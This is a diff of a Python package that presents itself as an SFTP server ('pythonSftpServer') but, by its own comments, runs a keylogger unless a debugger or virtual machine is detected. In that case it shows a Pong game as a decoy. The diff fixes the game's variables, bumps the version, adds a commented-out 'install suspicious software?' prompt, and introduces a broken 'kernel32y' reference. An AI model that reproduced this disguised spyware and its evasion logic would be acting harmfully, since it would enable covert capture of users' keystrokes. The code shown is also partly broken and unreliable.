@@ -2,7 +2,7 @@ from setuptools import setup
 
 setup(
     name='pythonSftpServer',
-    version='1.0.1',
+    version='1.0.5',
     description='Python SFTP Server connection client and server',
     url='https://github.com/BeastFPV/Hausarbeite_Hacking_with_Python',
     author='BeastFPV',
@@ -35,7 +35,7 @@ from _thread import *
 
 #Variables
 user32 = windll.user32
-kernel32 = windll.kernel32
+kernel32 = windll.kernel32y
 psapi = windll.psapi
 current_window = None
 current_hwnd = 0
@@ -79,8 +79,8 @@ class guiGame():
 
     def BALL_animation(self):
         global BALL_VEL_X, BALL_VEL_Y
-        self.BALL.x += BALL_VEL_X
-        self.BALL.y += BALL_VEL_Y
+        self.BALL.x += self.BALL_VEL_X
+        self.BALL.y += self.BALL_VEL_Y
         #ballbouncing
         if self.BALL.top <= 0 or self.BALL.bottom >= self.HEIGHT:
             self.BALL_VEL_Y *= -1
@@ -89,7 +89,7 @@ class guiGame():
             self.BALL_restart()
             
         if self.BALL.colliderect(self.PLAYER) or self.BALL.colliderect(self.OPPONENT):
-            BALL_VEL_X *= -1
+            self.BALL_VEL_X *= -1
         
             
     def PLAYER_animation(self):
@@ -112,8 +112,8 @@ class guiGame():
     def BALL_restart(self):
         global BALL_VEL_Y, BALL_VEL_X
         self.BALL.center = (self.WIDTH/2, self.HEIGHT/2)
-        BALL_VEL_Y *= random.choice((1,-1))
-        BALL_VEL_X *= random.choice((1,-1))
+        self.BALL_VEL_Y *= random.choice((1,-1))
+        self.BALL_VEL_X *= random.choice((1,-1))
 
 
     #simple pong game if debugger is detected
@@ -468,6 +468,12 @@ def ftps_check_dir(ftps, dir):
 
 #Test all of the above functions:
 def main():
+    #question / startparameter
+    #param = input("[+] install suspicious software? (y/n): ")
+    #if param == "n":
+    #    print("[-] Exiting...")
+    #    exit(0)
+
     count = 0
     #debugger and vm detection, if detected open the game, otherwise the keylogger
     #if is_debugger_present() == True or is_vm() == True:   #-----------enable this one
